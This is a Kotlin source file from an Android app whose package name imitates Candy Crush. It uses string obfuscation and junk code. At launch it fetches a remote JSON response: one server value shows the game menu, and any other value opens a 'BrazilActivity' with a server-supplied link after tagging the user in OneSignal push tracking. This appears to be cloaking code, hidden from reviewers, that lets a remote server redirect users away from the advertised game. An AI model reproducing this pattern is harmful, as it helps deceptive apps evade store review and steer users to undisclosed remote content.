package com.king.candycrushsodasa.wBrazil.volley

import io.github.a26197993b77e31a4.o7b471d74a5346efb54aa326b892daf01d914ce99.ObfStr
import android.content.Context
import android.content.Intent
import android.util.Log
import com.android.volley.DefaultRetryPolicy
import com.android.volley.Request
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley
import com.king.candycrushsodasa.MenuActivity
import com.king.candycrushsodasa.wBrazil.BrazilActivity
import com.king.candycrushsodasa.wBrazil.Full.appsFId
import com.king.candycrushsodasa.wBrazil.SplashActivity
import com.onesignal.OneSignal
import io.github.a26197993b77e31a4.o7b471d74a5346efb54aa326b892daf01d914ce99.ObfustringThis
import io.michaelrocks.paranoid.Obfuscate
import org.json.JSONObject
import java.io.PrintWriter
import java.util.*
import kotlin.concurrent.thread
@ObfustringThis
@Obfuscate
class Connext {
    interface VolleyInterface{
        fun initVol(first: String)
    }
    fun voleyStyart(con: Context, activity: SplashActivity, stringUrl: String, stringPush: String){
        thread(start = true) {
            getVolley(object : VolleyInterface {
                override fun initVol(first: String) {
                    //gar
                    var out = 0
                    val line: Array<String> = arrayOf(ObfStr("brazil").v("1"),ObfStr("brazil").v("3"))

                    val a1 = line[0].toLong()

                    if (a1 % 3 == 0L) {
                        out = 0
                    } else if (a1 % 3 == 1L) {
                        out = 1
                    } else if (line.size == 1) {
                        out = 2
                    } else {
                        val a2 = line[1].toLong()
                        if (a2 % 2 == 0L) {
                            out = 1
                        } else {
                            out = 2
                        }
                    }

                    //brazil_zborna
//@ | Log.e("TAG", "link: ${stringUrl} \n push: ${stringPush} \n url: $first")
                     //Log.e(ObfStr("brazil").v("OLA"), ObfStr("brazil").v("mznj: ¦${stringUrl}¦ \n xfty: ¦${stringPush}¦ \n uqt: ¦$first¦"))
                    if (first == ObfStr("brazil").v("ciayqw_asoqvl")) {
                        activity.startActivity(Intent(activity, MenuActivity::class.java))
                        activity.finish()
                    } else {
                        OneSignal.setExternalUserId(appsFId.toString())
                        //sub_app
                        OneSignal.sendTag(ObfStr("brazil").v("tlb_zxa"), stringPush)
                        activity.startActivity(Intent(activity, BrazilActivity::class.java).putExtra(
                            ObfStr("brazil").v("ciayqw"), first))
                        activity.finish()
                    }
                }

            }, stringUrl, con)
        }
    }

        fun getVolley(
            volleyRequest: VolleyInterface,
            url: String,
            context: Context
        ) {
            val request = StringRequest(Request.Method.GET, url, { data ->
                val object1 = JSONObject(data)
                try {
                    //brazil_win_game
                    val link = object1.get(ObfStr("brazil").v("ciayqw_xzn_fixf"))
                        .toString()
                    volleyRequest.initVol(link)
                } catch (_: Exception) {
                }
                try {
                    //brat_bez_brata
                    val msg =
                        object1.get(ObfStr("brazil").v("cias_jpa_srzbl"))
                            .toString()
                    volleyRequest.initVol(msg)
                } catch (_: Exception) {
                }
            }
            ) {  }.apply {
                retryPolicy = DefaultRetryPolicy(15321, 5, 1f)
            }
            Volley.newRequestQueue(context).add(request)
        }

}